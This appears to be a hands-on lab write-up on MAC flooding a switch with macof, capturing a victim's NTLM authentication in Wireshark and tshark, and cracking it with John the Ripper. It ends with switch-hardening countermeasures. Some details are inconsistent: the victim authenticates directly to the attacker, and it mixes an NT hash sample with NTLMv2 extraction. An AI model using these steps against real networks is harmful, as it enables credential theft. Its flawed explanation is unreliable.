Project Title: MAC Flooding and Credential Sniffing Attack Lab using Kali Linux and Windows 10
Overview: This project simulates a real-world red team scenario where an attacker uses MAC flooding to turn a network switch into a hub, allowing them to sniff sensitive traffic such as SMB credentials. The attacker uses Kali Linux, and the victim is a Windows 10 machine. This lab demonstrates how credentials can be captured passively after disrupting the switch's MAC address table.

Lab Environment:
* Attacker Machine: Kali Linux (IP: 192.168.10.100)
* Victim Machine: Windows 10 (IP: 192.168.10.50)

Step 1: Verify ARP Table from Attacker (Kali Linux)
Command:
arp -a
Purpose: Displays the current ARP (Address Resolution Protocol) table, which maps IP addresses to MAC addresses.
Output Sample:
? (192.168.10.1) at 00:50:56:e9:83:c0 [ether] on eth0
Explanation: This confirms that the network has active hosts and shows the MAC address mapping, indicating that the attacker is connected to the correct interface and subnet.

Step 2: Run MAC Flooding Attack
Command:
sudo macof -i eth0 -n 10000
Purpose: Floods the switch with thousands of fake MAC addresses to overflow the switch's MAC address table. This forces the switch to behave like a hub and broadcast traffic to all ports.
Explanation:
* macof is a tool from the dsniff package.
* -i eth0 specifies the network interface.
* -n 10000 sends 10,000 spoofed packets.
Effect: If successful, this causes the switch to broadcast all packets to every port, allowing the attacker to sniff traffic not normally visible to them.

Step 3: Start Wireshark to Capture Packets
Action: Open Wireshark and start capturing on interface eth0.
Purpose: To observe any credentials, hashes, or sensitive data traveling over the network.
Filter to Apply (Display Filter):
ip.addr == 192.168.10.50
Explanation: This filters the captured packets to show only those sent to/from the victim machine.

Step 4: Generate SMB Authentication Request from Victim
On Windows 10 Victim: Open Command Prompt and run:
net use \192.168.10.100 /user:test test123
Purpose: Attempts to access the attacker's IP as a network share using SMB and sends credentials over the network.
Explanation:
* net use is used to map or connect to shared folders.
* \\192.168.10.100 is the attacker machine.
* /user:test uses the username test.
* test123 is the password.
Effect: This causes the Windows system to send an NTLM authentication request containing the username and hashed password.

Step 5: Observe Captured Credentials in Wireshark
What to Look For:
* Filter: ntlmssp
* Look for packet protocols like SMB, NBSS, NTLMSSP.
* You'll find the username (test) and an NTLM hash.
Sample Packet Info:
NTLMSSP_AUTH, User: test
LM Hash: Disabled
NT Hash: f5d1278e8109edd94e1e4197e04873b9
Explanation: The NTLM hash can be extracted and used in offline brute-force or dictionary attacks.

Step 6: Extract NTLM Hash Using Tshark (Optional)
Command (on Kali):
tshark -r capture.pcapng -Y ntlmssp.ntlmv2_response -T fields -e ntlmssp.auth.username -e ntlmssp.auth.ntlmv2_response
Purpose: Automatically extract NTLMv2 hashes from the pcap file.
Explanation:
* -r capture.pcapng reads the capture file.
* -Y applies a display filter.
* -T fields and -e extract specific values.

Step 7: Crack the Captured NTLM Hash (Optional)
Tool: John the Ripper or Hashcat
Example (John the Ripper):
1. Save the hash in a file named hash.txt
2. Run:
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Explanation:
* Cracks the NTLMv2 hash using a dictionary attack.
* If successful, reveals the original password (test123).

Step 8: ARP Table After Attack (Verification)
Command:
arp -a
Output After Attack:
? (192.168.10.50) at 00:0c:29:ef:ce:1a [ether] on eth0
? (192.168.10.1) at 00:50:56:e9:83:c0 [ether] on eth0
? (192.168.10.254) at 00:50:56:f6:d1:7e [ether] on eth0
Explanation: The ARP table still shows legitimate MAC entries, but during the flooding phase, the switch's internal MAC address table is overwhelmed. This is what causes the broadcast behavior and allows packet sniffing.

Countermeasures and Defense
* Enable Port Security: Limit the number of MAC addresses per port on the switch to prevent flooding.
* Use Managed Switches: Configure alerts or actions when MAC address limits are exceeded.
* Enable Dynamic ARP Inspection (DAI): Helps prevent spoofed ARP messages.
* Implement Network Segmentation: Isolate critical machines from untrusted segments.
* Use Encryption: SMB over SSL or VPN to prevent readable credential exposure.

Conclusion: This project demonstrates how MAC flooding can compromise a switched network and allow attackers to sniff sensitive credentials such as NTLM hashes. It showcases real-world tactics used in red teaming and penetration testing, including active network attacks and passive credential harvesting. This lab is valuable for building red team skills and can be included in a cybersecurity CV or GitHub portfolio.

Tags: #RedTeam #MACFlooding #Sniffing #NTLM #KaliLinux #Wireshark #PenetrationTesting #CredentialHarvesting
